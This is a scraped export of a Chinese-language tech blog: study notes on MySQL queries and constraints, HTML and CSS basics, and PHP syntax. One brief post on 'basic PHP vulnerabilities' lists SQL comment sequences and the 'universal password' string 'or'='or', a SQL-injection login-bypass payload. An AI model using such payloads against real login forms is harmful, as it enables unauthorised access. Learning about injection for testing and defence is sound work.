12345678910111213141516171819202122232425第一次查询：mysql&gt; select avg(sal) as avgsal,deptno from emp group by deptno;+-------------+--------+| avgsal | deptno |+-------------+--------+| 2916.666667 | 10 || 2175.000000 | 20 || 1566.666667 | 30 |+-------------+--------+将查询出来的表作为一张新表 t，与 salgrade 表连接查询第二次查询：select t.*,s.grade from t join salgrade s on t.avgsal between s.losal and s.hisal;将表t 替换为select子查询select t.*,s.grade from (select avg(sal) as avgsal,deptno from emp group by deptno) t join salgrade s on t.avgsal between s.losal and s.hisal;mysql&gt; select t.*,s.grade from (select avg(sal) as avgsal,deptno from emp group by deptno) t join salgrade s on t.avgsal between s.losal and s.hisal;+-------------+--------+-------+| avgsal | deptno | grade |+-------------+--------+-------+| 2916.666667 | 10 | 4 || 2175.000000 | 20 | 4 || 1566.666667 | 30 | 3 |+-------------+--------+-------+ 示例二：找出每个部门平均的薪水等级 1234567891011121314151617181920212223242526272829员工，薪水等级：mysql&gt; select e.ename,e.deptno,s.grade from emp e left join salgrade s on e.sal between s.losal and s.hisal;+--------+--------+-------+| ename | deptno | grade |+--------+--------+-------+| SMITH | 20 | 1 || ADAMS | 20 | 1 || JAMES | 30 | 1 || WARD | 30 | 2 || MARTIN | 30 | 2 || MILLER | 10 | 2 || ALLEN | 30 | 3 || TURNER | 30 | 3 || JONES | 20 | 4 || BLAKE | 30 | 4 || CLARK | 10 | 4 || SCOTT | 20 | 4 || FORD | 20 | 4 || KING | 10 | 5 |+--------+--------+-------+mysql&gt; select e.deptno,avg(s.grade) from emp e left join salgrade s on e.sal between s.losal and s.hisal group by e.deptno;+--------+--------------+| deptno | avg(s.grade) |+--------+--------------+| 10 | 3.6667 || 20 | 2.8000 || 30 | 2.5000 |+--------+--------------+ select 后面嵌套 示例：查出每个员工对应的部门 1234567891011121314151617181920212223242526272829303132333435363738394041方法一：连接查询mysql&gt; select e.ename,d.dname from emp e left join dept d on e.deptno=d.deptno;+--------+------------+| ename | dname |+--------+------------+| CLARK | ACCOUNTING || KING | ACCOUNTING || MILLER | ACCOUNTING || SMITH | RESEARCH || JONES | RESEARCH || SCOTT | RESEARCH || ADAMS | RESEARCH || FORD | RESEARCH || ALLEN | SALES || WARD | SALES || MARTIN | SALES || BLAKE | SALES || TURNER | SALES || JAMES | SALES |+--------+------------+方法二：select嵌套selectmysql&gt; select e.ename,(select d.dname from dept d where e.deptno=d.deptno) as dname from emp e;+--------+------------+| ename | dname |+--------+------------+| SMITH | RESEARCH || ALLEN | SALES || WARD | SALES || JONES | RESEARCH || MARTIN | SALES || BLAKE | SALES || CLARK | ACCOUNTING || SCOTT | RESEARCH || KING | ACCOUNTING || TURNER | SALES || ADAMS | RESEARCH || JAMES | SALES || FORD | RESEARCH || MILLER | ACCOUNTING |+--------+------------+ union123456将查询的结果集相加条件：两张虚拟表具有 相同的列数虚拟表对应的列数的 数据类型 相同select ...... union select ...... 举例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647select ename from emp union select dname from dept;mysql&gt; select ename from emp union select dname from dept;+------------+| ename |+------------+| SMITH || ALLEN || WARD || JONES || MARTIN || BLAKE || CLARK || SCOTT || KING || TURNER || ADAMS || JAMES || FORD || MILLER || ACCOUNTING || RESEARCH || SALES || OPERATIONS |+------------+mysql&gt; select ename from emp union select 1111 from dept;+--------+| ename |+--------+| SMITH || ALLEN || WARD || JONES || MARTIN || BLAKE || CLARK || SCOTT || KING || TURNER || ADAMS || JAMES || FORD || MILLER || 1111 |+--------+15 rows in set (0.03 sec) 123注：用于联合查询出来的列数必须一致例如：不可select ename from emp union select dname,deptno from dept; limit limit 是 Mysql 特有的，其它数据库中没有，在 Oracle 中有一个类似的叫做 rownum limit 取结果集中的部分数据** 123456语法：limit a,b解释：a 表示从 a+1 号开始取，b 表示取几个数据startIndex 表示起始位置，从0开始，0为第一条数据length 表示取几个 示例一：查出编号前五名的员工 12345678910111213select ename,empno from emp limit 0,5;select ename,empno from emp limit 5;注：0,5 与 5 等价的，表示 0~5mysql&gt; select ename,empno from emp limit 0,5;+--------+-------+| ename | empno |+--------+-------+| SMITH | 7369 || ALLEN | 7499 || WARD | 7521 || JONES | 7566 || MARTIN | 7654 |+--------+-------+ 示例二：查出薪水第7~10名 1234567891011select ename,sal from emp order by sal desc limit 6,4;mysql&gt; select ename,sal from emp order by sal desc limit 6,4;+--------+---------+| ename | sal |+--------+---------+| ALLEN | 1600.00 || TURNER | 1500.00 || MILLER | 1300.00 || WARD | 1250.00 |+--------+---------+ 执行顺序 123456789101112select 5号from 1号where 2号group by 3号having 4号limit 6号注：limit 是 sql语句 最后执行的环节 通用标准分页1234将 a 条数据分成 b 页显示，每页显示（a/b）条数据第1页：limit 0,(a/b)......第n页：limit (n-1)*(a/b),(a/b) 约束 建表时，给表中的字段添加相应的一些约束，目的是保证表中数据的合法性，有效性，完整性。 包括： 12345非空约束（not null）：约束的字段不能为NULL唯一约束（unique）：约束的字段不能重复主键约束（primary key）：约束的字段既不能为NULL，也不能重复，简称PK外键约束（foreign key）：简称FK检查约束（check）：Oracle中有该约束，Mysql中不支持 非空约束 (not null) 12345create table t_stu( id int not null, name varchar(255) not null,);只有列级约束，没有表级约束 唯一约束 (unique) 唯一性约束的字段具有唯一性，不能重复，但可以为 NIULL ，也可存在多个NULL，因为NULL不是一个值。 123456789101112create table t_stu( id int unique, name varchar(255) unique,);列级约束：指 id 与 name 单独均不可重复create table t_stu( id int, name varchar(255), unique(id,name));表级约束：指 id 与 name 联合起来不允许重复，单独可重复 主键约束（primary key） 12345678910111213141516create table t_tea( id int primary key,//列级约束 name varchar(255));insert into t_tea(id,name) values(1,&#x27;lihua&#x27;);create table t_tea( id int, name varchar(255), primary key(id)//表级约束);insert into t_tea(id,name) values(1,&#x27;lihua&#x27;);相关术语：主键约束：primary key主键字段：id,name主键值：1,&#x27;lihua&#x27; 主键的作用： 12表设计三范式中要求：任何一张表中都应该有主键主键是改条记录在这张表中的 唯一标识 主键的分类： 12345678根据主键的字段数量划分：单一主键(只给一个字段添加主键约束)复合主键(多个字段联合起来添加一个主键约束)根据主键性质划分：自然主键业务主键：主键值与系统的业务挂钩，比如以身份证号，银行卡号作为主键等注：不推荐使用业务主键，以免以后业务发生改变，主键不易更改 注：在一张表中，主键约束只能有一个 主键值自增 1234567891011121314151617create table t_tea( id int primary key auto_increment, name varchar(255));insert into t_tea(name) values(&#x27;a&#x27;);insert into t_tea(name) values(&#x27;b&#x27;);insert into t_tea(name) values(&#x27;c&#x27;);mysql&gt; select * from t_tea;+----+------+| id | name |+----+------+| 1 | a || 2 | b || 3 | c |+----+------+注：Oracle 中提供了一个自增机制-序列（sequence）对象 外键约束 (foreign key) 1使用外键约束的字段去引用另一张表中的某个字段 12345678910111213141516171819202122232425262728293031323334353637相关术语：外键约束：foreign key外键字段： 外键值：drop table if exists t_stu;drop table if exists t_tea;//创建父表：老师表create table t_tea( teano int, name varchar(255), primary key(teano));insert into t_tea(teano,name) values(1001,&#x27;cao&#x27;);insert into t_tea(teano,name) values(1002,&#x27;li&#x27;);insert into t_tea(teano,name) values(1003,&#x27;zhou&#x27;);select * from t_tea;//创建子表：学生表create table t_stu( id int, name varchar(255), tno int, primary key(id), foreign key(tno) references t_tea(teano)//外键约束：t_stu表中的tno字段值只能为t_tea 表中的teano字段的值);insert into t_stu(id,name,tno) values(1,&#x27;wangwu&#x27;,1003);insert into t_stu(id,name,tno) values(2,&#x27;xiaohong&#x27;,1002);insert into t_stu(id,name,tno) values(3,&#x27;zhoujun&#x27;,1001);select * from t_stu;注:创建：先创建父表再创建子表插入数据：先插入父表再插入子表删除数据：先删除子表再删除父表删除表：先删除子表再删除父表外键可为 NULL 使用外键约束的字段去引用另一张表中的某个字段，被引用的字段一般为主键，不是主键也可，但必须有唯一性，即 unique 约束。 存储引擎 表的存储方式，不同存储引擎采用不同的方式在数据库中存储表 12查看当前 Mysql 支持的存储引擎：show engines; MyISAM 存储引擎 是最常用的，但不是默认的 ，它使用三个文件来表示每张表。格式文件：columns_priv.frm数据文件：columns_priv.MYD索引文件：columns_priv.MYI优点：可被转换为压缩，只读表来节省空间缺点：不支持事务 InnoDB 存储引擎 1.优点：支持事务，行级锁，外链等。2该存储引擎数据的安全得到保障。3.表的结构存储在 xxx.frm文件中 数据存储在 tablespqce这样的表空间中，无法被压缩，无法转换为只读4.该引擎在Mysql数据库崩溃之后会自动提供恢复机制。5.它支持级联删除和级联更新 MEMORY 存储引擎 1.不支持事务，数据容易丢失，由于所以数据和索引被存储在内存当中2.优点：查询速度最快","categories":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xizhi-future.github.io/categories/MYSQL/"}],"tags":[{"name":"MYSQL","slug":"MYSQL","permalink":"https://xizhi-future.github.io/tags/MYSQL/"}],"author":"xizhi-future"},{"title":"","slug":"PHP-基础漏洞","date":"2021-11-19T09:43:13.920Z","updated":"2021-11-19T10:16:22.599Z","comments":true,"path":"2021/11/19/PHP-基础漏洞/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/PHP-%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"123--+空格#/**/ 万能密码漏洞 12&#x27;or&#x27;=&#x27;or&#x27;","categories":[],"tags":[]},{"title":"HTML基础全","slug":"HTML基础全","date":"2021-11-19T08:45:05.000Z","updated":"2021-11-19T08:46:59.665Z","comments":true,"path":"2021/11/19/HTML基础全/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/","excerpt":"","text":"HTML 创建站点 – 环境：VScode创建站点：包含基本文件 VScode 配置 插件安装：插件将文件夹添加至工作区： 文件 – 将文件夹添加到工作区 – 选择文件夹新建 html 文档 ： 工作区选中文件夹中，Ctrl + N –&gt; Ctrl + S –&gt; 设置文件夹名，后缀为 .html 或者 .htm HTML基本架构：先输入一个 ! 号，然后按一下 Tab 键即可 基本架构理解 HTML（二） 概述+常用标签+转义字符(HyperText Markup Language)–超文本标记语言 1.用于编写网页，是一种解释型(写出来的代码即可直接进行运行,不需要编译)的语言2.其源文件是纯文本的，放在web根目录之下3.HTML是一种 标记语言，后缀名为 .html 或者是 .htm4.语法构成：标签+属性，即尖括号后开头为标签，标签中可设置 属性 以及 属性值，属性值放于引号中，不同属性用空格隔开5.HTML的运行环境是 浏览器6.注释： 123&lt;!--注释的内容 --&gt; 拓展：1.C语言源代码–&gt;编译–&gt;二进制文件–&gt;计算机解释执行Java同上2.HTML标签分为：单标签(空标签，没有结束标签)，双标签(成对出现) 1234567891011导入 CSS 文件：&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;**.css&quot;&gt;导入 JS 文件：&lt;script type=&quot;text/javascript&quot; src=&quot;/**.js&quot;&gt;&lt;/script&gt;CSS 代码：&lt;style type=&quot;text/css&quot;&gt;嵌入css样式代码&lt;/style&gt;JS 代码：&lt;script&gt;...&lt;/script&gt; 文本标签 标题标签 123456&lt;h1&gt; &lt;/h1&gt; 特点:其样式均为默认状态，即文本大小的设置，以及加粗设置&lt;h2&gt; &lt;/h2&gt;&lt;h3&gt; &lt;/h3&gt;&lt;h4&gt; &lt;/h4&gt;&lt;h5&gt; &lt;/h5&gt;&lt;h6&gt; &lt;/h6&gt; 123注：1.&lt;h1&gt;&lt;/h1&gt;标签在一个网页中最好只用一次2.这六个标题标签不能互相嵌套 文本相关设置标签 123456789101112131415161718192021222324252627282930&lt;i&gt;&lt;/i&gt; 倾斜&lt;em&gt;&lt;/em&gt; 强调斜体&lt;b&gt;&lt;/b&gt; 加粗&lt;strong&gt;&lt;/strong&gt;&lt;u&gt;&lt;/u&gt; 下划线&lt;sup&gt;&lt;/sup&gt; 下标&lt;sub&gt;&lt;/sub&gt; 上标&lt;p&gt;&lt;/p&gt; 段落&lt;span&gt;&lt;/span&gt; 字符 或 小段文本 标签，是 行内元素&lt;div&gt; 一个块，作容器，用于网页布局，是 块级元素&lt;font&gt;&lt;/font&gt; 字体设置 size color &lt;hr /&gt; 水平线&lt;br /&gt; 换行 &lt;del&gt;&lt;/del&gt; 删除线 A&lt;sup&gt;2&lt;/sup&gt; 下标 B&lt;sup&gt;2&lt;/sup&gt; 上标 12注：1.&lt;p&gt;&lt;/p&gt;标签中不能嵌套标题标签 扩展：**&lt; span &gt;与&lt; div &gt;**行内元素：一个行内元素只占据它对应标签的边框所包含的空间块级元素：块级元素占据其父元素（容器）的整个空间，创建了一个“块”，一般浏览器会在块级元素后另起一个新行。 超链接 12345678910&lt;a&gt;&lt;/a&gt; 属性： href=&quot;&quot; 跳转的路径 target=&quot;&quot;，属性值： _self(默认值，覆盖当前页面)； _blank(将会新弹出一个窗口) _parent 父窗口 _top 顶级窗口 _framename 窗口名 title=&quot;&quot; 提示信息 rel=&quot;nofollow&quot; 扩展 12空链接 &lt;a href=&quot;#&quot;&gt;&lt;/a&gt; a 模拟按钮 &lt;a href=&quot;javascript:void(0)&quot;&gt;按钮&lt;/a&gt; img 标签 12345678910&lt;img&gt; 属性： src=&quot;&quot; 图片路径 alt=&quot;&quot; 当图片未正常加载出来时，将会显示alt中的文本替换图片 利于SEO优化，由于搜索引擎无法读取图片上面的文本 title=&quot;&quot; 提示信息 width=&quot;&quot; 长 height=&quot;&quot; 宽 border=&quot;&quot; 边框 12345注：绝对路径： http://www.baidu.com相对路径：1.jpg ./1.jpg 当前 ./images/1.jpg 下一级 ../i.jpg 上一级 特殊字符 (转义字符)：| 结果 | 实体名称 || —- | ——– || 空格 | &amp;nbsp || &lt; | &amp;lt || &gt; | &amp;gt || &amp; | &amp;amp || “ | &amp;quot || ‘ | &amp;apos || © | &amp;copy | 1例如:输出 &lt;head&gt; &amp;lt;head&amp;gt; HTML实体：一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体。分为ASCLL，符号实体，字符实体。 多媒体标签，html5之后新增内容 123456&lt;audio src=&quot;./mus/1.mp3&quot;&gt;&lt;/audio&gt;&lt;video controls=&quot;controls&quot; width=&quot;300&quot; height=&quot;400&quot; loop poster=&quot;./images/linux.jpg&quot;&gt; &lt;source src=&quot;./mus/back.mp4&quot; type=&quot;video/mp4&quot;/&gt; &lt;source src=&quot;movie.webm&quot; type=&quot;video/webm&quot;/&gt;&lt;/video&gt; HTML（三）列表 与 表格HTML 列表 123456789101112131415161718192021222324&lt;ul&gt; 无序列表：默认样式--实心列表符号 &lt;li&gt;&lt;/li&gt; 使用：新闻条，页面主导航，轮播图 &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol&gt; 有序列表：默认样式--数字顺序 &lt;li&gt;&lt;/li&gt; 使用：新闻条，页面主导航，轮播图 &lt;li&gt;&lt;/li&gt; type属性：更改列表符号类型--a,A,i,I &lt;li&gt;&lt;/li&gt; start属性：控制列表符号开始位置，属性值只能为数字 &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ol&gt; &lt;dl&gt; 自定义列表 &lt;dt&gt;放一个名词&lt;/dt&gt; &lt;dd&gt;对该名词的解释&lt;/dd&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt;&lt;/dd&gt;&lt;/dl&gt; HTML 表格 表格标签： 123456789101112131415&lt;table&gt; 定义表格 &lt;caption&gt;表格标题&lt;/caption&gt; &lt;tr&gt; 定义行 &lt;th&gt;表头1&lt;/th&gt; 定义列 &lt;th&gt;表头2&lt;/th&gt; table属性： &lt;/tr&gt; width=&quot;&quot; 宽 &lt;tr&gt; height=&quot;&quot; 高 &lt;td&gt;&lt;/td&gt; border=&quot;&quot; 边框 &lt;td&gt;&lt;/td&gt; bordercolor=&quot;&quot; 边框颜色 &lt;/tr&gt; bgcolor=&quot;&quot; 背景颜色 &lt;tr&gt; cellspacing=&quot;0&quot; 边框间距 &lt;td&gt;&lt;/td&gt; cellpadding=&quot;0&quot; 边框与内容之间的距离 &lt;td&gt;&lt;/td&gt; align=&quot;&quot; 水平对齐方式,属性值：right,center,left &lt;/tr&gt; valign=&quot;&quot; 垂直对齐方式,属性值：top,middle,bottom&lt;/table&gt; 1234567合并单元格：均写在&lt;td&gt;标签中,*和谁合并删掉谁 colspan=&quot;数字&quot; 合并列 数字代表合并几个单元格 rowspan=&quot;数字&quot; 合并行 数字代表合并几个单元格合并列与合并行相结合：先合并列，再合并行对齐方式： align=&quot;&quot; 水平对齐方式,属性值：right,center,left valign=&quot;&quot; 垂直对齐方式,属性值：top,middle,bottom 123456HTML 表单中有两种类型的单元格： 表头单元格 - 包含表头信息（由 th 元素创建） 标准单元格 - 包含数据（由 td 元素创建）th 元素内部的文本通常会呈现为居中的粗体文本，而 td 元素内的文本通常是左对齐的普通文本 HTML（四）表单1.表单本身为一个框架，表单中有很多 控件（元素）2.本质：完成双向交互，向服务器提交信息，搜集用户信息3.表单的使用：搜索框，登录框，文件上传，注册，留言板等等 表单标签： 12345678910111213&lt;form&gt;&lt;/form&gt;属性： name=&quot;&quot; 表单的名称 action=&quot;&quot; 属性值为 &quot;接口地址&quot; 把数据提交到服务器的 URL 如果为空则提交到当前页面，也可采用绝对路径与相对路径 method=&quot;&quot; 数据传输方式：&quot;get / post&quot; enctype 提交类型 当上传文件时，要写该属性， enctype=&quot;application/x-www-form-urlencoded&quot; enctype=&quot;multipart/form-data&quot; target 在何处打开目标 URL 表单内部元素： &lt;input &gt; get 与 post get 默认值，显示提交，长度限制2KB，向服务器索取数据post ”安全隐式提交“，无长度限制，一般准备数据提交后服务器处理再交付get 参数提交到URL中，在URL中有显示，且 URL长度有限制 post 上传文件等 数据流 HTTP请求正文中 input 标签 1234567&lt;input type=&quot;&quot; value=&quot;&quot; &gt;属性： type 决定 input 所生成的表单类型 value 作为 input 的值，根据 type 的不同而作用不同 maxlength 最大长度 size 以字符为单位控制input的大小 name 属性名 input标签 的 type 属性 123456789password 密码框 text 文本框radio 单选框 （性别 name 值必须相同才能是单选框）checkbox 复选框 reset 重置按钮 submit 提交按钮button 空按钮file 文件域 hidden 隐藏内容 123enctypeapplication/x-www-form-urlencoded 默认值multipart/form-data 上传文件时使用 文本域： 123&lt;textarea cols=&quot;&quot; rows=&quot;&quot;&gt;&lt;/textarea&gt; 下拉列表： 1234567&lt;select name=&quot;&quot; size=&quot;&quot;&gt; &lt;options&gt; &lt;/options&gt;&lt;/select&gt;disabledreadonly 页面的嵌套:iframe：从一个页面中引入另一个页面 123&lt;a name=&quot;1.html&quot; target=&quot;frame1&quot;&gt;1.html&lt;/a&gt;&lt;iframe name=&quot;frame1&quot; src=&quot;1.html&quot; width=&quot;300&quot; height=&quot;400&quot; frameborder=&quot;1&quot;&gt;&lt;/iframe&gt; 管理控制台： 查看器：所查看的内容叫做 DOM –即文档对象模型–即树形结构，浏览器构造的控制台：可以执行JS代码网络：显示整个页面的所有网络请求 页面的网络连接存储：存储了页面的Cookie信息 CSS （五）层叠样式表css 注释：/* */ 一、语法组成：由 选择符 和 声明 构成 1.选择符用于选择 标签2.声明分为：属性 和 属性值，二者之间用冒号连接3.声明放于花括号中，每条声明以分号结束注：所有CSS代码必须放在CSS样式表中 二、CSS样式表： 1.内部样式表 — 创建：style 标签，最好放在 head 标签中 1&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt; 2.外部样式表 — 创建：新建一个.css文件(开头最好写上@charset &quot;utf-8&quot;; 用于控制当前编码格式)，然后导入到 html 页面内 导入方式： 123456789101112方法一：&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./text.css&quot;&gt; rel=&quot;stylesheet&quot; 与css样式表建立关联性 href=&quot;&quot; 导入css样式表的路径 方法二：&lt;style&gt; @import url(路径); &lt;/style&gt;区别：1.本质：link是一个html标签；@import是css提供的一个导入方法2.加载顺序不同：link--导入的css代码与html同时加载；@import--等待html结构加载完毕后再加载样式3.兼容性：link兼容性较好4.JS操作dom的区别 3.内联样式表（内行样式）— 创建： &lt;标签 style=”样式表内容”&gt;&lt;/标签&gt; 123&lt;p style=&quot;border: 1px solid red; padding 10px&quot;&gt; 测试&lt;/p&gt; 样式表的权重关系：体现了CSS的 层叠性 1.内联样式表 权重最高2.内部样式表 和 外部样式表 的权重关系与先后顺序有关，后面覆盖之前的注：仅仅覆盖产生冲突的属性（即相同的属性），不同的属性将继续执行。 CSS（六）选择符及其权重一、类型选择符 (标签选择符) 123将html的 标签 当作 选择符 特点：将会选择该页面中所有同类型的标签 使用：想要更改清除某标签的默认样式时，或者是想要统一某个标签样式时 二、id 选择器 1234使用：1.起id名称：给指定标签起一个 id名称 &lt;标签 id=&quot;名称&quot;&gt;&lt;/标签&gt; 2. 写样式：#id名称&#123;css代码&#125; 特点：唯一性 – 同一个页面只能出现一次,主要用于划分网页外围结构 id命名规范： 三、类选择器 (class选择器) 1234使用：1.起class名称： &lt;标签 class=&quot;名称 名称 名称...&quot;&gt;&lt;/标签&gt;2.写样式：.class名称&#123;css代码&#125; 特点:1.同一个class可重复出现2.一个标签可以有多个类名，空格隔开3.可以用于调用一类样式 四、包含选择器 (关联选择器) 12345678910111213使用：嵌套.父元素选择符 .子元素选择符&#123;css代码&#125;也可使用 # 使用较灵活例子：table a&#123; color: #000;&#125;仅仅控制 table 中的 a 标签&lt;a href=&quot;www.baidu.com&quot;&gt;百度&lt;/a&gt;&lt;table&gt; &lt;a href=&quot;www.baidu.com&quot;&gt;百度&lt;/a&gt;&lt;/table&gt; 五、群组选择符 1234567891011使用：选择符1，选择符2，选择符3...&#123;css代码&#125;例子：h1,h2,h3&#123; color: #111;&#125;&lt;h1&gt;1&lt;/h1&gt;&lt;h2&gt;2&lt;/h2&gt;&lt;h3&gt;3&lt;/h3&gt; 六、通配符： * 选中页面中所有标签 123456*&#123; margin:0; 盒子外围间距 padding:0; 盒子内部间距 &#125; 将页面中所有标签的 页面间距 均清零 因此每次在样式开头记得写上 七、伪类选择器： 123456 a:link&#123;color: #ff0000; text-decoration: none&#125; 初始状态的样式 a:visited&#123;color: #00ff 00; text-decoration: none&#125; 点击过后的样式 a:hover&#123;color: #0000ff; text-decoration: none&#125; 鼠标划过的样式 a:active&#123;color: #0f0f00; text-decoration: none&#125; 鼠标按下的样式 注：不要更改这四个样式的顺序 hover 可更改自身以及自己子元素的样式，无法更改其父元素的样式 1234567常用方式：交互a:&#123; color:black; 默认颜色黑色 &#125;a:hover&#123; color:red; 鼠标划过时红色 &#125; 实现划过父元素更改子元素： 划过子元素更改父元素无法实现 CSS 选择符的权重1. ! important &gt; 内联样式 &gt; id &gt; class &gt; 标签 1234567内联样式 1000id 100class、伪类 10标签 1通配符 0 包含选择符 权重是所有权重之和群组选择符 权重保持不变，看顺序，后覆盖前 2.CSS选择符的权重关系体现CSS的层叠性 3.开发者样式 &gt; 读者样式 &gt; 浏览器样式 CSS 中常见的属性color 颜色属性： 12background-color: rgba(255,255,255,0); #最后一个代表透明度background-color: #FFFFFF; font 属性： 1234font-size: #大小font-family:&quot;Microsoft Yahei&quot; #字体：font-style: #normal正常 italic斜体 oblique 倾斜的字体 font-weight: #字体加粗 bold 文本属性： 1234567891011text-indent:30px 首行缩进text-overflow: 文本溢出是否使用 省略号white-space:nowrap 强制在同一行显示文本overflow:hidden; white-space:nowrap; text-overflow:ellipsis; 常用的搭配text-align: left center right 位置text-decoration: none underline line-through贯穿线text-shadow:1px 1px rgba(0,0,0,0.3) 阴影letter-spacing: 文字或字母间距line-height: 行高color: 颜色 边框属性： 12345678910border: 宽度 样式 颜色border-color:border-style:border-width:border-left-color:border-left-style:border-left-width:border-radius: 圆角处理box-shadow: 设置或检索对象阴影 补充：css 响应式布局 Bootstrap最受欢迎的 css js html框架，用于开发响应式布局 bootstrap 差钱全部依赖 JQuery 下载：https://v3.bootcss.com/ Jquery 下载：https://jquery.com/ 一定要导入以上三个文件 然后在 class 里面改指定的名称即可 能够看到 bootstrap 在之前的基础上有默认添加了一些样式用于美化 可以在官网看具体用法：https://v3.bootcss.com/css/","categories":[{"name":"HTML","slug":"HTML","permalink":"https://xizhi-future.github.io/categories/HTML/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://xizhi-future.github.io/tags/HTML/"}],"author":"xizhi-future"},{"title":"PHP基础全集","slug":"PHP基础全集","date":"2021-11-19T08:44:49.000Z","updated":"2021-11-19T08:45:59.073Z","comments":true,"path":"2021/11/19/PHP基础全集/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/PHP%E5%9F%BA%E7%A1%80%E5%85%A8%E9%9B%86/","excerpt":"","text":"PHP（一）概述+基本语法php概述： 1.主要目标是允许网络开发人员快速编写动态页面，主要被用于开发各种类型的网站程序2.收集表单数据，生成动态页面，字符串处理，动态输出图像，处理服务器端文件，与数据库交互，会话跟踪，处理XML文件，支持大量的网络协议3.PHP是脚本语言，后缀名为 .php,不需要事先编译，直接运行在服务器端4.PHP是一种弱类型语言，变量不需要声明其类型5.PHP脚本按从上到下依次执行6.PHP可与HTML进行混编，可嵌入到html代码中任何地方，且一个html文档中看嵌入多个PHP标记，脚本后缀名仍为 .php 运行环境运行在windows,linux等操作系统上 windows phpstudy linux 单独安装 PHP运行环境安装： Apache+PHP+MySQL LAMP 编辑器安装 ： zendstudio notepad++ 基本语法 1.PHP标记： 开始标记 &lt;?php 结束标记 ?&gt; 文件末尾的PHP代码结束标记在一些情况下可以省略 2. 指令分隔符：;一个PHP语句使用分号结束 3.**注释**：`单行注释 //` 和 `多行注释 /* */` 4.空白符：空格 Tab制表符 换行 英文状态输入 5.随机数： rand(19); 指19范围内的随机数 6.Error: 结束脚本执行 Warning~ / Notice: 只提示，不影响执行 拓展： PHP代码中的注释：不会显示在浏览器的源代码中，因为PHP的运行环境是服务器，而浏览器看到的是PHP引擎运行PHP代码后的执行结果；HTML代码中的注释：可以显示在浏览器上 简单语句 123456phpinfo(); 查询php版本信息echo 输出var_dump(); 用于输出变量值及其变量类型形式：变量类型（变量值）gettype()var_dump(gettype($a)); PHP（二）变量 常量一、变量 $ 符号开头 声明 : 不需要声明变量,但需要初始化 、 初始化：赋值= 释放：unset() 判断一个变量是否存在：isset() 命名： 字母 | 数字 |下划线，不可以数字开头，严格区分大小写，尽量不要使用PHP关键字作为变量名例如：$name1 $_name2 $my_name 变量的引用赋值：$c=&amp;$a; $a与$c指向同一块内存空间 即 $a 随 $c 的改变而改变 变量与字符串之间使用.连接 1.变量的类型 布尔类型：值为 true 或者是 falseint: 整数float: 浮点数string:字符串数组:array对象 :object常量： define(&quot;a&quot;,&quot;90&quot;);预定义常量 2.以下内容会自动转换为false 1.布尔值false2.03.浮点型0.04.空白字符串/字符串05.没有成员的数组6.NULL 3.字符串的定义1234单引号: &#x27; &#x27;双引号: &quot; &quot;定界符: &lt;&lt;&lt; 注意：定界符的开始于结束不能有任何字符，包括空白字符和注释 12345678单引号与双引号：1.单引号不能解析变量，双引号可以解析变量；2.双引号执行转义字符，单引号不执行；3.单引号输出特殊字符时需要转义,双引号不需要；4.当双引号中插入单引号，单引号中插入变量$a时(即 echo &quot;&#x27;$a&#x27;&quot;; )，会解析为&quot;$a&quot;5.最好使用单引号，因为单引号效率高于双引号；6.在双引号中插入变量时，变量要使用&#123;&#125;括起来；注：也可在变量后加上一个空格或者一个逗号，这种方法虽然可以解析出变量内容，但输出时也会输出一个空格和一个逗号，不提倡使用。 例如：结果为 定界符使用： 1234$a=&lt;&lt;&lt;ABCjiayouABC;echo $a; 二、常量123456789&lt;?phpdefine(&quot;a&quot;,&quot;90&quot;);echo a;echo &quot;&lt;br /&gt;&quot;;define(&quot;b&quot;,&quot;jiayou&quot;);var_dump(b);echo &quot;&lt;br /&gt;&quot;;var_dump(define(&quot;c&quot;)); //false?&gt; 1.预定义常量 预定义常量 常量值 PHP_OS 执行PHP解释器的操作系统名称 PHP_VERSION 当前PHP版本 DIRECTORY_SEPARATOR 分隔符 ： \\ 或者是 / PHP_SAPI 用来判断是使用命令行还是浏览器执行的，如果 PHP_SAPI==’cli’ 表示是在命令行下执行 E_ERROR 最近的错误处 E_WARNING 最近的警告处 E_PARSE 分析语法的潜在问题 E_ NOTICE 发生不寻常但不一定错误 PHP_EOL 系统换行符，Windows是（\\r\\n），Linux是（/n），MAC是（\\r） DIRECTORY_SEPARATOR 系统目录分隔符，Windows是反斜线（\\），Linux是斜线（/） PATH_SEPARATOR 多路径间分隔符，Windows是反斜线（;），Linux是斜线（:） 2.魔术常量 魔术常量 常量值 __FILE__ 返回文件的完整路径和文件名 __LINE__ 返回文件中的当前行号 __DIR__ 文件当前路径，等价于 dirname(__FILE__) __FUNCTUON__ 当前函数名 __CLASS__ 当前类名 __METHOD__ 当前对象的方法名 __TRAIT__ Trait 的名字 __NAMESPACE__ 当前命名空间的名称 12根据操作系统决定目录分隔符windows 为 \\ Linux为 / 注： 1.单引号定义的字符串中的单引号需要转义字符/&#39; 2.单引号定义的字符串中，$原样输出 3.双引号定义的字符串中，$是变量的开始，且需要使用&#123;&#125;将变量括住，否则不知其何时结束识别不出 4.单双引号定义的字符串中，特殊字符均需要转义 三、PHP 变量的范围 局部变量：函数内部定义的变量，作用范围是本函数全局变量：在函数外部定义的变量，作用于PHP整个脚本静态变量：函数内部用 static 定义，,仅在函数初次执行时被初始化 在函数中使用全局变量： 1.通过传参2.global 声明为全局变量 常量 的作用域是 超全局 的 define(&quot;a&quot;,&quot;90&quot;); PHP（三） 运算符运算符： 运算符 描述 算术运算符 整型，浮点型 逻辑运算符 布尔类型 比较运算符 比较参与运算的单元是否相同，相同为真，不同为假 赋值运算符 